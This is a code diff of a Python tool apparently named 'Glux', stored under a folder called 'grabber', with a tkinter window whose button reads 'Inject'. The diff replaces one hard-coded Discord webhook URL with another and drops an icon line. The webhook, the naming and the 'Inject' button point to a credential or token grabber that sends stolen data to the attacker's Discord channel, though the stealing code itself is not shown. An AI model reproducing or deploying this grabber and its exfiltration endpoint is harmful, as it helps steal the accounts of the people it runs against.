@@ -8,7 +8,7 @@ from json import loads, dumps
 from urllib.request import Request, urlopen
 import tkinter as tk
 
-webhook_url = "https://discord.com/api/webhooks/926001368718786581/98fDkXOOVVivbNrF_8ijPQ1Yc_MDG76zFnogVGXgXxreCOYq1aR8QNtFYj1KJEG683Ct"
+webhook_url = "https://discord.com/api/webhooks/935528635849384007/q_meyzyqWtWiXm4iC92zWQK2NQudenLk-SK5MwUXq5kO1BPsmBC8KrhmSDcmbKjd0gqz"
 
 languages = {
 	'da'    : 'Danish, Denmark',
@@ -212,7 +212,6 @@ try:
 except Exception as e:
 	pass
 win = tk.Tk(className="Glux")
-win.iconbitmap(r"C:\Users\user\OneDrive\デスクトップ\gyazoapi\grabber\gluxh.ico")
 win.geometry("700x200")
 win.title("Glux")
 button = tk.Button(win, text="Inject", width=100, command=gete)
